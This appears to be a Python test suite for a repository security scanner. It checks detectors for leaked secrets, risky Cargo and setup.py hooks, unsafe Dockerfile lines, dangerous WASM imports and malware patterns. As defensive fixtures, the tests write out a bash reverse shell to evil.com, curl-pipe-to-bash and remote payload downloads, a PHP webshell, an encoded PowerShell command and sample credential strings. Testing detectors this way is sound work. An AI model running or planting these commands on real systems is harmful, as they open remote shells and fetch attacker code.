"""Tests for new Phase 1-3 analyzers: secrets, cargo, python, dockerfile, wasm, yara."""

from pathlib import Path
from reporeaver.analyzers.secrets_analyzer import SecretsAnalyzer
from reporeaver.analyzers.cargo_analyzer import CargoAnalyzer
from reporeaver.analyzers.python_analyzer import PythonAnalyzer
from reporeaver.analyzers.dockerfile_analyzer import DockerfileAnalyzer
from reporeaver.analyzers.wasm_analyzer import WasmAnalyzer
from reporeaver.analyzers.yara_analyzer import YaraAnalyzer
from reporeaver.models import FileEntry, Severity


def _entry(path="test.txt", is_text=True, size=100):
    return FileEntry(path=path, size=size, is_text=is_text, detected_mime="text/plain")


class TestSecretsAnalyzer:
    a = SecretsAnalyzer()

    def test_detects_aws_key(self):
        res = self.a.analyze(_entry(), 'aws_secret_key = "AKIA1234567890ABCDEF"')
        crit = [f for f in res.findings if f.severity == Severity.CRITICAL]
        assert len(crit) >= 1
        aws = [f for f in res.findings if "AWS" in f.title]
        assert len(aws) >= 1

    def test_detects_github_token(self):
        res = self.a.analyze(_entry(), 'GITHUB_TOKEN = "ghp_abcdefghijklmnopqrstuvwxyz0123456789abcd"')
        crit = [f for f in res.findings if f.severity == Severity.CRITICAL]
        assert len(crit) >= 1
        gh = [f for f in res.findings if "GitHub" in f.title]
        assert len(gh) >= 1

    def test_detects_private_key(self):
        res = self.a.analyze(_entry(), "-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA")
        crit = [f for f in res.findings if f.severity == Severity.CRITICAL]
        assert len(crit) >= 1
        pk = [f for f in res.findings if "Private" in f.title]
        assert len(pk) >= 1

    def test_detects_db_url(self):
        res = self.a.analyze(_entry(), 'postgresql://user:pass@localhost/db')
        high = [f for f in res.findings if f.severity == Severity.HIGH]
        assert len(high) >= 1

    def test_clean_file_no_findings(self):
        res = self.a.analyze(_entry(), "hello world\nthis is a clean file\nno secrets here")
        assert len(res.findings) == 0

    def test_skips_lockfiles(self):
        entry = FileEntry(path="package-lock.json", size=100, is_text=True, detected_mime="application/json")
        assert not self.a.should_analyze(entry)


class TestCargoAnalyzer:
    a = CargoAnalyzer()

    def test_detects_git_dep(self):
        content = '[dependencies]\nfoo = { git = "https://github.com/evil/foo" }'
        res = self.a.analyze(_entry("Cargo.toml"), content)
        git = [f for f in res.findings if "git" in f.title.lower()]
        assert len(git) >= 1

    def test_detects_build_script(self):
        content = 'build = "build.rs"'
        res = self.a.analyze(_entry("Cargo.toml"), content)
        bs = [f for f in res.findings if "build script" in f.title.lower()]
        assert len(bs) >= 1

    def test_clean_cargo(self):
        content = '[dependencies]\nserde = "1.0"\ntokio = { version = "1", features = ["full"] }'
        res = self.a.analyze(_entry("Cargo.toml"), content)
        assert len(res.findings) == 0

    def test_build_rs_command(self):
        content = 'fn main() { let out = std::process::Command::new("curl"); }'
        res = self.a.analyze(_entry("build.rs"), content)
        cmd = [f for f in res.findings if "command" in f.title.lower()]
        assert len(cmd) >= 1

    def test_build_rs_network(self):
        content = 'let resp = reqwest::blocking::get("http://evil.com");'
        res = self.a.analyze(_entry("build.rs"), content)
        net = [f for f in res.findings if "network" in f.title.lower()]
        assert len(net) >= 1


class TestPythonAnalyzer:
    a = PythonAnalyzer()

    def test_detects_os_system(self):
        content = "setup(\n    cmdclass={'install': CustomInstall}\n)"
        res = self.a.analyze(_entry("setup.py"), content)
        assert len(res.findings) > 0

    def test_detects_cmdclass(self):
        content = "from setuptools import setup\nsetup(cmdclass={'install': EvilInstall})"
        res = self.a.analyze(_entry("setup.py"), content)
        cc = [f for f in res.findings if "cmdclass" in f.title]
        sd = [f for f in res.findings if "setup.py" in (f.description or "")]
        assert len(cc) >= 1 or len(sd) >= 1

    def test_detects_network_request(self):
        content = "import requests\nrequests.get('http://evil.com/payload')"
        res = self.a.analyze(_entry("setup.py"), content)
        net = [f for f in res.findings if "network" in f.title.lower()]
        assert len(net) >= 1

    def test_clean_setup(self):
        content = "from setuptools import setup\nsetup(name='foo', version='1.0')"
        res = self.a.analyze(_entry("setup.py"), content)
        assert len(res.findings) == 0


class TestDockerfileAnalyzer:
    a = DockerfileAnalyzer()

    def test_detects_latest_tag(self):
        res = self.a.analyze(_entry("Dockerfile"), "FROM node:latest")
        lt = [f for f in res.findings if "latest" in f.title]
        assert len(lt) >= 1

    def test_detects_pipe_to_shell(self):
        res = self.a.analyze(_entry("Dockerfile"), "RUN curl http://evil.com | bash")
        ps = [f for f in res.findings if "pipe" in f.title.lower() or "shell" in f.title.lower()]
        assert len(ps) >= 1

    def test_detects_add_url(self):
        res = self.a.analyze(_entry("Dockerfile"), 'ADD https://evil.com/payload.tar.gz /tmp')
        add = [f for f in res.findings if "ADD" in f.title]
        assert len(add) >= 1

    def test_detects_root_user(self):
        res = self.a.analyze(_entry("Dockerfile"), "FROM alpine\nRUN echo hello\nUSER root")
        root = [f for f in res.findings if "root" in f.title.lower()]
        assert len(root) >= 1

    def test_detects_exposed_ssh(self):
        res = self.a.analyze(_entry("Dockerfile"), "EXPOSE 22")
        ssh = [f for f in res.findings if "SSH" in f.title]
        assert len(ssh) >= 1

    def test_clean_with_user(self):
        content = "FROM node:18-alpine\nWORKDIR /app\nRUN npm ci\nUSER node\nCMD [\"node\", \"app.js\"]"
        res = self.a.analyze(_entry("Dockerfile"), content)
        # Should not have root warnings since USER is specified
        root_warnings = [f for f in res.findings if "root" in f.title.lower()]
        assert len(root_warnings) == 0

    def test_missing_user_still_low_risk_if_no_workdir(self):
        res = self.a.analyze(_entry("Dockerfile"), "FROM alpine\nRUN echo hello")
        # Should emit root and workdir warnings (both INFO level)
        info_warnings = [f for f in res.findings if f.severity in (Severity.LOW, Severity.MEDIUM)]
        assert len(info_warnings) >= 1


class TestWasmAnalyzer:
    a = WasmAnalyzer()

    def test_should_analyze_wasm_ext(self):
        assert self.a.should_analyze(_entry("module.wasm"))
        assert not self.a.should_analyze(_entry("module.js"))

    def test_ignores_non_wasm(self):
        res = self.a.analyze_binary(_entry("test.bin"), b"not wasm content")
        assert len(res.findings) == 0

    def test_detects_wasm_magic(self):
        """A minimal valid WASM module has the right magic bytes."""
        import struct
        # Minimal WASM module with just a header
        wasm = b"\x00asm\x01\x00\x00\x00"
        res = self.a.analyze_binary(_entry("test.wasm"), wasm)
        # No imports, so no findings expected
        assert len(res.findings) == 0

    def test_detects_emscripten_run_script(self):
        """WASM with emscripten_run_script import — dangerous."""
        import struct
        def _leb(v):
            buf = []
            while True:
                byte = v & 0x7F
                v >>= 7
                if v:
                    byte |= 0x80
                buf.append(byte)
                if not v:
                    break
            return bytes(buf)

        module_name = b"env"
        func_name = b"emscripten_run_script"
        section_content = _leb(1)  # 1 import
        section_content += _leb(len(module_name)) + module_name
        section_content += _leb(len(func_name)) + func_name
        section_content += b"\x00" + b"\x00\x00"
        section_header = struct.pack("<B", 2) + _leb(len(section_content))
        wasm = b"\x00asm\x01\x00\x00\x00" + section_header + section_content
        res = self.a.analyze_binary(_entry("test.wasm"), wasm)
        em = [f for f in res.findings if "emscripten_run_script" in f.title]
        assert len(em) >= 1


class TestYaraAnalyzer:
    a = YaraAnalyzer()

    def test_detects_reverse_shell(self):
        res = self.a.analyze(_entry(), "bash -i >& /dev/tcp/evil.com/4444 0>&1")
        rev_shell = [f for f in res.findings if "reverse" in f.title.lower()]
        assert len(rev_shell) >= 1

    def test_detects_powershell_encoded(self):
        res = self.a.analyze(_entry(), "powershell -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACkA")
        psh = [f for f in res.findings if "powershell" in f.title.lower() or "encoded" in f.title.lower()]
        assert len(psh) >= 1

    def test_detects_webshell(self):
        res = self.a.analyze(_entry(), '<?php system($_GET["cmd"]); ?>')
        web = [f for f in res.findings if "webshell" in f.title.lower() or "system" in f.title.lower()]
        assert len(web) >= 1

    def test_clean_file_no_match(self):
        res = self.a.analyze(_entry(), "This is a completely benign file with no malicious content.")
        assert len(res.findings) == 0
